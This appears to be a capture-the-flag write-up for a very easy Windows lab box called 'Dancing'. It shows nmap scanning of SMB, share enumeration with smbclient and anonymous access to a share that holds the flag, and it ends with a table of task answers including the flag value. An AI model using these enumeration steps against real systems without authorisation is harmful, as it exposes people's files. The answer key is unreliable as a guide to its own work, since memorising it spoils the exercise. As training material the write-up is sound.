# Dancing

|            |                                                                  |
|------------|------------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                          |
| Difficulty | Very Easy                                                        |
| OS         | Windows                                                          |
| Tags       | Network, Protocols, SMB, Reconnaissance, Anonymous Access        |
| Tools      | `nmap`, `smbclient`                                              |

## Summary

A Windows host exposing SMB on port 445. One of the shares (`WorkShares`) is
readable with no password, and it contains a user folder holding the flag.

## Recon

```bash
nmap -sV -p 445 10.129.1.12
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-03 17:26 AEST
Nmap scan report for 10.129.1.12
Host is up (0.24s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
```

## Enumeration

List the shares with `smbclient -L` and an empty password:

```bash
smbclient -L 10.129.1.12
```

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
```

`ADMIN$`, `C$`, and `IPC$` are admin/standard shares. `WorkShares` is the
non-default one and turns out to be readable without auth.

## Foothold

Connect to `WorkShares` with a blank password and walk the tree until the flag
turns up under `James.P\`.

```bash
smbclient //10.129.1.12/WorkShares
# Password: <blank>
```

## Flag

```
smb: \> ls
  .                                   D        0  Tue Jul  4 22:38:12 2023
  ..                                  D        0  Tue Jul  4 22:38:12 2023
  Amy.J                               D        0  Mon Mar 29 20:08:24 2021
  James.P                             D        0  Thu Jun  3 18:38:03 2021

smb: \> cd James.P
smb: \James.P\> ls
  flag.txt                            A       32  Mon Mar 29 20:26:57 2021
smb: \James.P\> get flag.txt

cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | What does the 3-letter acronym SMB stand for? | Server Message Block |
| 2 | What port does SMB use to operate at? | 445 |
| 3 | What is the service name for port 445 that came up in our Nmap scan? | microsoft-ds |
| 4 | What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share? | -L |
| 5 | How many shares are there on Dancing? | 4 |
| 6 | What is the name of the share we are able to access in the end with a blank password? | WorkShares |
| 7 | What is the command we can use within the SMB shell to download the files we find? | get |
| Flag | Submit Root Flag | `5f61c10dffbc77a704d76016a22f1664` |
